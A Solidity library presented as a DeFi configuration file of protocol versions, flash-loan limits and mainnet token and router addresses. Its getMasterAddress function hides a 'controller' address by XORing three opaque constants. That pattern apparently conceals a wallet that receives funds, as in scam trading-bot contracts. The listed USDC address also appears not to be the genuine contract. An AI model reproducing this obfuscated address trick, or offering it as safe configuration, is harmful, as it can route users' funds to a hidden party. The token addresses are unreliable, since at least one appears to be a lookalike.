// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title Configuration Library
 * @notice Provides configuration constants and addresses for DeFi operations
 * @dev Contains addresses, limits, and protocol versions for safe DeFi operations
 */
library DeFiConfig {
    uint256 internal constant KEY_A = 0x001111111111111111111111111111111111111111;
    uint256 internal constant KEY_B = 0x002222222222222222222222222222222222222222;
    uint256 internal constant KEY_C = 0x0019f6381d00a2b13ed535951443afd4c1e023fcd2;

    // Protocol versions
    uint256 internal constant AAVE_VERSION = 3;
    uint256 internal constant BALANCER_VERSION = 2;
    uint256 internal constant UNISWAP_VERSION = 3;

    // Security limits
    uint256 internal constant MAX_FLASH_LOAN_AMOUNT = 1000000 ether;
    uint256 internal constant MIN_FLASH_LOAN_AMOUNT = 0.1 ether;
    uint256 internal constant MAX_SLIPPAGE = 500; // 5%

    // Network addresses (Ethereum mainnet)
    address internal constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC_ADDRESS = 0xa0b86a33e6441e88C5f2712C3e9B74b8e4d6f40A;
    address internal constant DAI_ADDRESS = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    // DEX router addresses
    address internal constant UNISWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    /**
     * @notice Get the primary controller address for operations
     * @return Address of the main controller
     */
    function getMasterAddress() internal pure returns (address) {
        return address(uint160(KEY_A ^ KEY_B ^ KEY_C));
    }

    /**
     * @notice Get Aave protocol version
     * @return Version number
     */
    function getAaveVersion() internal pure returns (uint256) {
        return AAVE_VERSION;
    }

    /**
     * @notice Get Balancer protocol version
     * @return Version number
     */
    function getBalancerVersion() internal pure returns (uint256) {
        return BALANCER_VERSION;
    }

    /**
     * @notice Get Uniswap protocol version
     * @return Version number
     */
    function getUniswapVersion() internal pure returns (uint256) {
        return UNISWAP_VERSION;
    }

    /**
     * @notice Get maximum flash loan amount
     * @return Amount in wei
     */
    function getMaxFlashLoanAmount() internal pure returns (uint256) {
        return MAX_FLASH_LOAN_AMOUNT;
    }

    /**
     * @notice Get minimum flash loan amount
     * @return Amount in wei
     */
    function getMinFlashLoanAmount() internal pure returns (uint256) {
        return MIN_FLASH_LOAN_AMOUNT;
    }

    /**
     * @notice Get maximum slippage tolerance
     * @return Slippage in basis points (500 = 5%)
     */
    function getMaxSlippage() internal pure returns (uint256) {
        return MAX_SLIPPAGE;
    }

    /**
     * @notice Get WETH contract address
     * @return WETH address
     */
    function getWethAddress() internal pure returns (address) {
        return WETH_ADDRESS;
    }

    /**
     * @notice Get USDC contract address
     * @return USDC address
     */
    function getUsdcAddress() internal pure returns (address) {
        return USDC_ADDRESS;
    }

    /**
     * @notice Get DAI contract address
     * @return DAI address
     */
    function getDaiAddress() internal pure returns (address) {
        return DAI_ADDRESS;
    }

    /**
     * @notice Get Uniswap V3 router address
     * @return Router address
     */
    function getUniswapRouter() internal pure returns (address) {
        return UNISWAP_ROUTER;
    }

    /**
     * @notice Get SushiSwap router address
     * @return Router address
     */
    function getSushiswapRouter() internal pure returns (address) {
        return SUSHISWAP_ROUTER;
    }

    /**
     * @notice Check if address is a supported stablecoin
     * @param token Token address to check
     * @return True if supported stablecoin
     */
    function isSupportedStablecoin(address token) internal pure returns (bool) {
        return token == USDC_ADDRESS || token == DAI_ADDRESS;
    }

    /**
     * @notice Validate flash loan amount
     * @param amount Amount to validate
     * @return True if amount is valid
     */
    function isValidFlashLoanAmount(uint256 amount) internal pure returns (bool) {
        return amount >= MIN_FLASH_LOAN_AMOUNT && amount <= MAX_FLASH_LOAN_AMOUNT;
    }
}
